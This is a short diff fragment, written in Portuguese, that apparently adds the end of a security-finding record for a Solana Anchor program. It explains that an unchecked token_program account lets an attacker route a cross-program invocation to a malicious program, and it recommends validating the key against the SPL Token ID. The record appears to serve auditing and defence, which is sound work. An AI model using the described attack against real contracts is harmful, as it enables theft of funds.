+    "attack_hypothesis": "O atacante fornece uma conta `token_program` controlada por um programa malicioso. Como a chave nao e validada contra o ID oficial do SPL Token, a CPI invoca o programa do atacante, que pode executar logica arbitraria (ex: desviar fundos ou falsificar transferencias) em vez da transferencia legitima de tokens.",
+    "mitigation": "Usar o tipo `Program<'info, Token>` do Anchor ou validar explicitamente `require_keys_eq!(ctx.accounts.token_program.key(), spl_token::ID)` antes da invocacao."
+  }
+}
